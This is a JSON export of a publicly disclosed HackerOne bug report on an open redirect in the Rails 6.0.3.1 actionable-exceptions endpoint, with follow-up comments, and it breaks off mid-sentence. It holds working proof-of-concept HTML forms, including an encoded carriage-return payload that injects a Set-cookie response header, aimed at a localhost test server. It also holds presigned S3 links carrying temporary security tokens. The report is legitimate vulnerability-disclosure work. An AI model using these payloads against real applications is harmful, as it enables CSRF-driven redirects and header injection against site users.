{"id":904059,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC85MDQwNTk=","url":"https://hackerone.com/reports/904059","title":"Open Redirect (6.0.0 \u003c rails \u003c 6.0.3.2)","state":"Closed","substate":"resolved","severity_rating":"high","readable_substate":"Resolved","created_at":"2020-06-21T02:15:14.122Z","submitted_at":"2020-06-21T02:15:14.122Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"ooooooo_q","url":"/ooooooo_q","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/012/811/4b35334fa2fcf93b2e510174e09470fb42bbf03a_original.gif/3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a"},"is_me?":false,"cleared":false,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":22,"url":"https://hackerone.com/rails","handle":"rails","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/000/022/5e2b46658c8b86bed62f574d8e1793f353cbbc63_original.png/3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a","medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/022/5e2b46658c8b86bed62f574d8e1793f353cbbc63_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"permissions":[],"submission_state":"open","default_currency":"usd","awards_miles":false,"offers_bounties":true,"state":"public_mode","only_cleared_hackers":false,"profile":{"name":"Ruby on Rails","twitter_handle":null,"website":"http://rubyonrails.org/security","about":"Web development that doesn't hurt."}},"has_bounty?":true,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"stage":4,"public":true,"visibility":"full","cve_ids":[],"singular_disclosure_disabled":false,"disclosed_at":"2020-12-22T16:47:02.435Z","bug_reporter_agreed_on_going_public_at":"2020-11-22T16:46:58.144Z","team_member_agreed_on_going_public_at":null,"comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"Hello,\nI was looking at the change log (https://github.com/rails/rails/commit/2121b9d20b60ed503aa041ef7b926d331ed79fc2) for CVE-2020-8185 and found another problem existed.\n\nhttps://github.com/rails/rails/blob/v6.0.3.1/actionpack/lib/action_dispatch/middleware/actionable_exceptions.rb#L21\n\n```ruby\n  redirect_to request.params[:location]\nend\n\nprivate\n  def actionable_request?(request)\n    request.show_exceptions? \u0026\u0026 request.post? \u0026\u0026 request.path == endpoint\n  end\n\n  def redirect_to(location)\n    body = \"\u003chtml\u003e\u003cbody\u003eYou are being \u003ca href=\\\"#{ERB::Util.unwrapped_html_escape(location)}\\\"\u003eredirected\u003c/a\u003e.\u003c/body\u003e\u003c/html\u003e\"\n\n    [302, {\n      \"Content-Type\" =\u003e \"text/html; charset=#{Response.default_charset}\",\n      \"Content-Length\" =\u003e body.bytesize.to_s,\n      \"Location\" =\u003e location,\n    }, [body]]\n  end\n```\n\nThere was an open redirect issue because the request parameter `location` was not validated.\nIn 6.0.3.2, since the condition of `actionable_request?` has changed, this problem is less likely to occur.\n\n\n### PoC\n\n\n#### 1. Prepare server\n\nPrepare an attackable 6.0.3.1 version of Rails server\n\n```\n❯ rails -v\nRails 6.0.3.1\n\n❯ RAILS_ENV=production rails s\n...\n* Environment: production\n* Listening on tcp://0.0.0.0:3000\n```\n\n#### 2. Attack server \n\nPrepare the server for attack on another port.\n\n```html\n\u003cform method=\"post\" action=\"http://localhost:3000/rails/actions?error=ActiveRecord::PendingMigrationError\u0026action=Run%20pending%20migrations\u0026location=https://www.hackerone.com/\"\u003e\n\t\u003cbutton type=\"submit\"\u003eclick!\u003c/button\u003e\n\u003c/form\u003e\n````\n\n```\npython3 -m http.server 8000\n```\n\n#### 3. Open browser\n\nOpen the `http://localhost:8000/attack.html` url in your browser and click the button.\nRedirect to `https://www.hackerone.com/` url.\n\n{F876518}\n\n## Impact\n\nIt will be fixed with 6.0.3.2 as with CVE-2020-8185(https://groups.google.com/g/rubyonrails-security/c/pAe9EV8gbM0), but I think it is necessary to announce it again because the range of influence is different.\n\nThis open redirect changes from POST method to Get Method, so it may be difficult to use for phishing.On the other hand, it may affect bypass of referrer check or SSRF.","vulnerability_information_html":"\u003cp\u003eHello,\u003cbr\u003e\nI was looking at the change log (\u003ca title=\"https://github.com/rails/rails/commit/2121b9d20b60ed503aa041ef7b926d331ed79fc2\" href=\"/redirect?url=https%3A%2F%2Fgithub.com%2Frails%2Frails%2Fcommit%2F2121b9d20b60ed503aa041ef7b926d331ed79fc2\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://github.com/rails/rails/commit/2121b9d20b60ed503aa041ef7b926d331ed79fc2\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e) for CVE-2020-8185 and found another problem existed.\u003c/p\u003e\n\n\u003cp\u003e\u003ca title=\"https://github.com/rails/rails/blob/v6.0.3.1/actionpack/lib/action_dispatch/middleware/actionable_exceptions.rb#L21\" href=\"/redirect?url=https%3A%2F%2Fgithub.com%2Frails%2Frails%2Fblob%2Fv6.0.3.1%2Factionpack%2Flib%2Faction_dispatch%2Fmiddleware%2Factionable_exceptions.rb%23L21\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://github.com/rails/rails/blob/v6.0.3.1/actionpack/lib/action_dispatch/middleware/actionable_exceptions.rb#L21\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight ruby\"\u003e\u003ccode\u003e  \u003cspan class=\"n\"\u003eredirect_to\u003c/span\u003e \u003cspan class=\"n\"\u003erequest\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nf\"\u003eparams\u003c/span\u003e\u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"ss\"\u003e:location\u003c/span\u003e\u003cspan class=\"p\"\u003e]\u003c/span\u003e\n\u003cspan class=\"k\"\u003eend\u003c/span\u003e\n\n\u003cspan class=\"kp\"\u003eprivate\u003c/span\u003e\n  \u003cspan class=\"k\"\u003edef\u003c/span\u003e \u003cspan class=\"nf\"\u003eactionable_request?\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003erequest\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n    \u003cspan class=\"n\"\u003erequest\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nf\"\u003eshow_exceptions?\u003c/span\u003e \u003cspan class=\"o\"\u003e\u0026amp;\u0026amp;\u003c/span\u003e \u003cspan class=\"n\"\u003erequest\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nf\"\u003epost?\u003c/span\u003e \u003cspan class=\"o\"\u003e\u0026amp;\u0026amp;\u003c/span\u003e \u003cspan class=\"n\"\u003erequest\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nf\"\u003epath\u003c/span\u003e \u003cspan class=\"o\"\u003e==\u003c/span\u003e \u003cspan class=\"n\"\u003eendpoint\u003c/span\u003e\n  \u003cspan class=\"k\"\u003eend\u003c/span\u003e\n\n  \u003cspan class=\"k\"\u003edef\u003c/span\u003e \u003cspan class=\"nf\"\u003eredirect_to\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003elocation\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n    \u003cspan class=\"n\"\u003ebody\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026quot;\u0026lt;html\u0026gt;\u0026lt;body\u0026gt;You are being \u0026lt;a href=\u003c/span\u003e\u003cspan class=\"se\"\u003e\\\u0026quot;\u003c/span\u003e\u003cspan class=\"si\"\u003e#{\u003c/span\u003e\u003cspan class=\"no\"\u003eERB\u003c/span\u003e\u003cspan class=\"o\"\u003e::\u003c/span\u003e\u003cspan class=\"no\"\u003eUtil\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nf\"\u003eunwrapped_html_escape\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003elocation\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\u003cspan class=\"si\"\u003e}\u003c/span\u003e\u003cspan class=\"se\"\u003e\\\u0026quot;\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026gt;redirected\u0026lt;/a\u0026gt;.\u0026lt;/body\u0026gt;\u0026lt;/html\u0026gt;\u0026quot;\u003c/span\u003e\n\n    \u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"mi\"\u003e302\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n      \u003cspan class=\"s2\"\u003e\u0026quot;Content-Type\u0026quot;\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u0026gt;\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026quot;text/html; charset=\u003c/span\u003e\u003cspan class=\"si\"\u003e#{\u003c/span\u003e\u003cspan class=\"no\"\u003eResponse\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nf\"\u003edefault_charset\u003c/span\u003e\u003cspan class=\"si\"\u003e}\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\n      \u003cspan class=\"s2\"\u003e\u0026quot;Content-Length\u0026quot;\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u0026gt;\u003c/span\u003e \u003cspan class=\"n\"\u003ebody\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nf\"\u003ebytesize\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nf\"\u003eto_s\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\n      \u003cspan class=\"s2\"\u003e\u0026quot;Location\u0026quot;\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u0026gt;\u003c/span\u003e \u003cspan class=\"n\"\u003elocation\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\n    \u003cspan class=\"p\"\u003e},\u003c/span\u003e \u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"n\"\u003ebody\u003c/span\u003e\u003cspan class=\"p\"\u003e]]\u003c/span\u003e\n  \u003cspan class=\"k\"\u003eend\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eThere was an open redirect issue because the request parameter \u003ccode\u003elocation\u003c/code\u003e was not validated.\u003cbr\u003e\nIn 6.0.3.2, since the condition of \u003ccode\u003eactionable_request?\u003c/code\u003e has changed, this problem is less likely to occur.\u003c/p\u003e\n\n\u003ch3 id=\"poc\"\u003ePoC\u003c/h3\u003e\n\n\u003ch4 id=\"1-prepare-server\"\u003e1. Prepare server\u003c/h4\u003e\n\n\u003cp\u003ePrepare an attackable 6.0.3.1 version of Rails server\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003e❯ rails -v\nRails 6.0.3.1\n\n❯ RAILS_ENV=production rails s\n...\n* Environment: production\n* Listening on tcp://0.0.0.0:3000\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003ch4 id=\"2-attack-server\"\u003e2. Attack server\u003c/h4\u003e\n\n\u003cp\u003ePrepare the server for attack on another port.\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight html\"\u003e\u003ccode\u003e\u003cspan class=\"nt\"\u003e\u0026lt;form\u003c/span\u003e \u003cspan class=\"na\"\u003emethod=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;post\u0026quot;\u003c/span\u003e \u003cspan class=\"na\"\u003eaction=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;http://localhost:3000/rails/actions?error=ActiveRecord::PendingMigrationError\u0026amp;action=Run%20pending%20migrations\u0026amp;location=https://www.hackerone.com/\u0026quot;\u003c/span\u003e\u003cspan class=\"nt\"\u003e\u0026gt;\u003c/span\u003e\n    \u003cspan class=\"nt\"\u003e\u0026lt;button\u003c/span\u003e \u003cspan class=\"na\"\u003etype=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;submit\u0026quot;\u003c/span\u003e\u003cspan class=\"nt\"\u003e\u0026gt;\u003c/span\u003eclick!\u003cspan class=\"nt\"\u003e\u0026lt;/button\u0026gt;\u003c/span\u003e\n\u003cspan class=\"nt\"\u003e\u0026lt;/form\u0026gt;\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003epython3 -m http.server 8000\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003ch4 id=\"3-open-browser\"\u003e3. Open browser\u003c/h4\u003e\n\n\u003cp\u003eOpen the \u003ccode\u003ehttp://localhost:8000/attack.html\u003c/code\u003e url in your browser and click the button.\u003cbr\u003e\nRedirect to \u003ccode\u003ehttps://www.hackerone.com/\u003c/code\u003e url.\u003c/p\u003e\n\n\u003cp\u003e\u003ca class=\"markdown-attachment-link markdown-attachment-inline-reference\" data-attachment-filename=\"__________2020-06-21_10.26.21.png\" data-attachment-link=\"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/Ro3WSUcNhjSZthT2cTFoSsaV?response-content-disposition=attachment%3B%20filename%3D%22__________2020-06-21_10.26.21.png%22%3B%20filename%2A%3DUTF-8%27%27__________2020-06-21_10.26.21.png\u0026amp;response-content-type=image%2Fpng\u0026amp;X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026amp;X-Amz-Credential=ASIAQGK6FURQWNRUTH42%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026amp;X-Amz-Date=20201229T070919Z\u0026amp;X-Amz-Expires=3600\u0026amp;X-Amz-SignedHeaders=host\u0026amp;X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJ7%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIQDcXnaGBkilw8dIKZyXl6DRxz9df9dptFudyUshXKqyWAIgSXT73ENLhDU6dLXYGFlV10idtU9V2hyklLccKQ0pfc4qtAMIVxABGgwwMTM2MTkyNzQ4NDkiDKv2f94JRMR8IDO%2BDSqRA%2BK92cStxN8BDvQvva7qLjZYQ%2Bo98Fq3WIsgdmuFbIWsVJNwAy9k36tIyEf3m3YkkPzTJYVMwITIBEkRL7L4%2FFE2VrmH%2FyWnGeYlz1087dpv%2F8n%2BxePAsT9JNIFo5HL3qLY3wx5zNeJGSe7ackrU2%2B4TZ8z8qbQZZubLBkMOYL7lOQXDjEYLq5BtfLJIwgsBRHC2NLNyq6BdOntSBGR32vUAcnQqwd7ZcEJ7tGOzWQF%2BJot83YJ8JCzHEMxhl2LU%2F0YJcbPoth69auXP8wEPzX2DHDgHxtnnIFnJ7h%2B4wD%2FTBqDNIETiU2WW8Ob9t0Zs2iUxD2lI0uOCEk4VJMxTio93bdaLG0Cqp%2FsW8lf0i8K%2FidJBgsA1ot5if4EPj5GsJP1ha%2BDrqfU1OPLXLgEerUYAAWbHcGQOw1wjhp%2FQto2Op32UfzJwe1sq3HWqGyEa4L8s6I5ZGerD0JkUyXNQfMagBxQbG%2F50bbeTa%2F5q1laxcg0mB0AWThwG2y8HFFzrMyHoDfXL9iVBL2AuI%2FQDZ2RQMMSSq%2F8FOusBTEdo884p95XUeJQfuG1%2BgTLLaqVoYv81fOpIhbdBUDobBmrKTkhHdApg0IpS%2Fmn%2FQFTO2whPecmg5pGV5XOL1b%2B8atqSJJyBMIlcat39%2Fiw8998Wyo8KiVjdgzHFjwlEAiOS8qICceyxSIMCo8GBoYMUw94x3fGxeAXRgVqeyIErabkA8MSj9Rgz1QonRErPS3nuhkrc1lcEtwZYHvorWyjM1lTHvoGCzNSk%2F194BT4g8N2vxEy6S1dD6EiNpxPG4MaDwpuQBWRwL0Te7R5iox%2B0JLPR8s2xdgRZInm7WgUjUF8HQEmcy%2FsTmQ%3D%3D\u0026amp;X-Amz-Signature=7be76bd4124d1c871e6ce2156622ce0e5d4f6d6f2537483dd52c2845010cf49e\" data-attachment-type=\"image/png\"\u003e\u003cimg src=\"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/Ro3WSUcNhjSZthT2cTFoSsaV?response-content-disposition=attachment%3B%20filename%3D%22__________2020-06-21_10.26.21.png%22%3B%20filename%2A%3DUTF-8%27%27__________2020-06-21_10.26.21.png\u0026amp;response-content-type=image%2Fpng\u0026amp;X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026amp;X-Amz-Credential=ASIAQGK6FURQWNRUTH42%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026amp;X-Amz-Date=20201229T070919Z\u0026amp;X-Amz-Expires=3600\u0026amp;X-Amz-SignedHeaders=host\u0026amp;X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJ7%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIQDcXnaGBkilw8dIKZyXl6DRxz9df9dptFudyUshXKqyWAIgSXT73ENLhDU6dLXYGFlV10idtU9V2hyklLccKQ0pfc4qtAMIVxABGgwwMTM2MTkyNzQ4NDkiDKv2f94JRMR8IDO%2BDSqRA%2BK92cStxN8BDvQvva7qLjZYQ%2Bo98Fq3WIsgdmuFbIWsVJNwAy9k36tIyEf3m3YkkPzTJYVMwITIBEkRL7L4%2FFE2VrmH%2FyWnGeYlz1087dpv%2F8n%2BxePAsT9JNIFo5HL3qLY3wx5zNeJGSe7ackrU2%2B4TZ8z8qbQZZubLBkMOYL7lOQXDjEYLq5BtfLJIwgsBRHC2NLNyq6BdOntSBGR32vUAcnQqwd7ZcEJ7tGOzWQF%2BJot83YJ8JCzHEMxhl2LU%2F0YJcbPoth69auXP8wEPzX2DHDgHxtnnIFnJ7h%2B4wD%2FTBqDNIETiU2WW8Ob9t0Zs2iUxD2lI0uOCEk4VJMxTio93bdaLG0Cqp%2FsW8lf0i8K%2FidJBgsA1ot5if4EPj5GsJP1ha%2BDrqfU1OPLXLgEerUYAAWbHcGQOw1wjhp%2FQto2Op32UfzJwe1sq3HWqGyEa4L8s6I5ZGerD0JkUyXNQfMagBxQbG%2F50bbeTa%2F5q1laxcg0mB0AWThwG2y8HFFzrMyHoDfXL9iVBL2AuI%2FQDZ2RQMMSSq%2F8FOusBTEdo884p95XUeJQfuG1%2BgTLLaqVoYv81fOpIhbdBUDobBmrKTkhHdApg0IpS%2Fmn%2FQFTO2whPecmg5pGV5XOL1b%2B8atqSJJyBMIlcat39%2Fiw8998Wyo8KiVjdgzHFjwlEAiOS8qICceyxSIMCo8GBoYMUw94x3fGxeAXRgVqeyIErabkA8MSj9Rgz1QonRErPS3nuhkrc1lcEtwZYHvorWyjM1lTHvoGCzNSk%2F194BT4g8N2vxEy6S1dD6EiNpxPG4MaDwpuQBWRwL0Te7R5iox%2B0JLPR8s2xdgRZInm7WgUjUF8HQEmcy%2FsTmQ%3D%3D\u0026amp;X-Amz-Signature=7be76bd4124d1c871e6ce2156622ce0e5d4f6d6f2537483dd52c2845010cf49e\" class=\"markdown-inline-image\" style=\"display: inline-block\"\u003e\u003c/a\u003e\u003c/p\u003e\n\n\u003ch2 id=\"impact\"\u003eImpact\u003c/h2\u003e\n\n\u003cp\u003eIt will be fixed with 6.0.3.2 as with CVE-2020-8185(\u003ca title=\"https://groups.google.com/g/rubyonrails-security/c/pAe9EV8gbM0\" href=\"/redirect?url=https%3A%2F%2Fgroups.google.com%2Fg%2Frubyonrails-security%2Fc%2FpAe9EV8gbM0\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://groups.google.com/g/rubyonrails-security/c/pAe9EV8gbM0\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e), but I think it is necessary to announce it again because the range of influence is different.\u003c/p\u003e\n\n\u003cp\u003eThis open redirect changes from POST method to Get Method, so it may be difficult to use for phishing.On the other hand, it may affect bypass of referrer check or SSRF.\u003c/p\u003e\n","bounty_amount":"1000.0","formatted_bounty":"$1,000","weakness":{"id":53,"name":"Open Redirect"},"original_report_id":null,"original_report_url":null,"attachments":[{"id":876518,"file_name":"__________2020-06-21_10.26.21.png","expiring_url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/Ro3WSUcNhjSZthT2cTFoSsaV?response-content-disposition=attachment%3B%20filename%3D%22__________2020-06-21_10.26.21.png%22%3B%20filename%2A%3DUTF-8%27%27__________2020-06-21_10.26.21.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQWNRUTH42%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20201229T070920Z\u0026X-Amz-Expires=3600\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJ7%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIQDcXnaGBkilw8dIKZyXl6DRxz9df9dptFudyUshXKqyWAIgSXT73ENLhDU6dLXYGFlV10idtU9V2hyklLccKQ0pfc4qtAMIVxABGgwwMTM2MTkyNzQ4NDkiDKv2f94JRMR8IDO%2BDSqRA%2BK92cStxN8BDvQvva7qLjZYQ%2Bo98Fq3WIsgdmuFbIWsVJNwAy9k36tIyEf3m3YkkPzTJYVMwITIBEkRL7L4%2FFE2VrmH%2FyWnGeYlz1087dpv%2F8n%2BxePAsT9JNIFo5HL3qLY3wx5zNeJGSe7ackrU2%2B4TZ8z8qbQZZubLBkMOYL7lOQXDjEYLq5BtfLJIwgsBRHC2NLNyq6BdOntSBGR32vUAcnQqwd7ZcEJ7tGOzWQF%2BJot83YJ8JCzHEMxhl2LU%2F0YJcbPoth69auXP8wEPzX2DHDgHxtnnIFnJ7h%2B4wD%2FTBqDNIETiU2WW8Ob9t0Zs2iUxD2lI0uOCEk4VJMxTio93bdaLG0Cqp%2FsW8lf0i8K%2FidJBgsA1ot5if4EPj5GsJP1ha%2BDrqfU1OPLXLgEerUYAAWbHcGQOw1wjhp%2FQto2Op32UfzJwe1sq3HWqGyEa4L8s6I5ZGerD0JkUyXNQfMagBxQbG%2F50bbeTa%2F5q1laxcg0mB0AWThwG2y8HFFzrMyHoDfXL9iVBL2AuI%2FQDZ2RQMMSSq%2F8FOusBTEdo884p95XUeJQfuG1%2BgTLLaqVoYv81fOpIhbdBUDobBmrKTkhHdApg0IpS%2Fmn%2FQFTO2whPecmg5pGV5XOL1b%2B8atqSJJyBMIlcat39%2Fiw8998Wyo8KiVjdgzHFjwlEAiOS8qICceyxSIMCo8GBoYMUw94x3fGxeAXRgVqeyIErabkA8MSj9Rgz1QonRErPS3nuhkrc1lcEtwZYHvorWyjM1lTHvoGCzNSk%2F194BT4g8N2vxEy6S1dD6EiNpxPG4MaDwpuQBWRwL0Te7R5iox%2B0JLPR8s2xdgRZInm7WgUjUF8HQEmcy%2FsTmQ%3D%3D\u0026X-Amz-Signature=e146d58856d0557c5cd990c17e9d43f744e9f9e4a9187784056272fa8c2b8dc7","file_size":790214,"type":"image/png"}],"allow_singular_disclosure_at":"2020-12-22T16:46:58.201Z","allow_singular_disclosure_after":-570141.80648945,"singular_disclosure_allowed":true,"vote_count":10,"voters":["mzfr","mygf","elmahdi","ms-13","zimmer75","jespert","bigwookie3000","meispi","nl0quent","hifor7"],"severity":{"rating":"high","author_type":"User"},"structured_scope":{"databaseId":160,"asset_type":"SOURCE_CODE","asset_identifier":"https://github.com/rails/rails","max_severity":"critical"},"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"can_edit_custom_fields_attributes":false,"activities":[{"id":8359201,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"I thought about it after submitting the report, but even in 6.0.3.2, `/rails/actions` is available in developer mode.\nIf it was started in development mode, the request will be accepted by CSRF, so the same as CVE-2020-8185 still exists.\nI think it's better to take CSRF measures in `/rails/actions`.\n\n#### Vulnerabilities, versions and modes\n\n- 6.0.3.1 (production, development)\n  - run pending migrations (CVE-2020-8185)\n  - open redirect\n- 6.0.3.2 (development)\n  - run pending migrations (by CSRF)\n  - open redirect (by CSRF)\n- 6.0.3.2 (production)\n  - no problem","markdown_message":"\u003cp\u003eI thought about it after submitting the report, but even in 6.0.3.2, \u003ccode\u003e/rails/actions\u003c/code\u003e is available in developer mode.\u003cbr\u003e\nIf it was started in development mode, the request will be accepted by CSRF, so the same as CVE-2020-8185 still exists.\u003cbr\u003e\nI think it\u0026#39;s better to take CSRF measures in \u003ccode\u003e/rails/actions\u003c/code\u003e.\u003c/p\u003e\n\n\u003ch4 id=\"vulnerabilities-versions-and-modes\"\u003eVulnerabilities, versions and modes\u003c/h4\u003e\n\n\u003cul\u003e\n\u003cli\u003e6.0.3.1 (production, development)\n\n\u003cul\u003e\n\u003cli\u003erun pending migrations (CVE-2020-8185)\u003c/li\u003e\n\u003cli\u003eopen redirect\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003cli\u003e6.0.3.2 (development)\n\n\u003cul\u003e\n\u003cli\u003erun pending migrations (by CSRF)\u003c/li\u003e\n\u003cli\u003eopen redirect (by CSRF)\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003cli\u003e6.0.3.2 (production)\n\n\u003cul\u003e\n\u003cli\u003eno problem\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003c/ul\u003e\n","automated_response":false,"created_at":"2020-06-21T05:55:08.833Z","updated_at":"2020-06-21T05:55:08.833Z","actor":{"username":"ooooooo_q","cleared":false,"url":"/ooooooo_q","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/012/811/4b35334fa2fcf93b2e510174e09470fb42bbf03a_original.gif/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"rails","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":8847934,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"This seems like a good improvement, but I don't think we need to treat it as a security issue.  If you agree, would you mind filing an issue on the Rails GitHub issues?\n\nThank you!","markdown_message":"\u003cp\u003eThis seems like a good improvement, but I don\u0026#39;t think we need to treat it as a security issue.  If you agree, would you mind filing an issue on the Rails GitHub issues?\u003c/p\u003e\n\n\u003cp\u003eThank you!\u003c/p\u003e\n","automated_response":false,"created_at":"2020-08-04T19:23:19.013Z","updated_at":"2020-08-04T19:23:19.013Z","actor":{"username":"tenderlove","cleared":false,"url":"/tenderlove","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/003/318/60d828744b5d16813ecbf975fdc453dc4a933f4f_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"rails","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":8847940,"is_internal":false,"editable":false,"type":"Activities::BugNeedsMoreInfo","message":"","markdown_message":"","automated_response":false,"created_at":"2020-08-04T19:24:03.212Z","updated_at":"2020-08-04T19:24:03.212Z","actor":{"username":"jack_mccracken","cleared":false,"url":"/jack_mccracken","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/164/342/6543dc397b4dbb2c24dc81f92a42de654a3e6a99_original.jpeg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"rails","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":8945588,"is_internal":false,"editable":false,"type":"Activities::BugNew","message":"@tenderlove \nI'm sorry to reply late.\n\nWhile researching unicorn, I found this report to lead to other vulnerabilities.\n\n### Open Redirect to HTTP header injection\n\nResponse header injection vulnerability exists in versions of puma below 4.3.2.\nhttps://github.com/puma/puma/security/advisories/GHSA-84j7-475p-hp8v\nI have confirmed that unicorn is also enable of response header injection.\n\nHTTP header injection is possible by including `\\r` in the redirect URL using these.\n\n#### PoC\n\n```js \n\u003e escape(\"\\rSet-cookie:a=a\")\n\"%0DSet-cookie%3Aa%3Da\"\n```\n\nThis is the html used on the attack server.\n\n```html\n\u003cform method=\"post\" action=\"http://localhost:3000/rails/actions?error=ActiveRecord::PendingMigrationError\u0026action=Run%20pending%20migrations\u0026location=%0DSet-cookie%3Aa%3Da\"\u003e\n  \u003cbutton type=\"submit\"\u003eset cookie\u003c/button\u003e\n\u003c/form\u003e\n```\n\nWhen click this button, the response header will be as follows.\n\n```\nLocation: \nSet-cookie: a=a\n```\n\nIf you open the developer tools in your browser, you'll see that the cookie value is set.\n\nWhen I tried it, puma and unicorn can insert only the character of `\\r`, and it seems that `\\n` cannot be inserted.\nTherefore, it seems that response body injection that leads to XSS cannot be performed.\n\nOn the other hand, in passenger, it became an error when `\\r` was in the 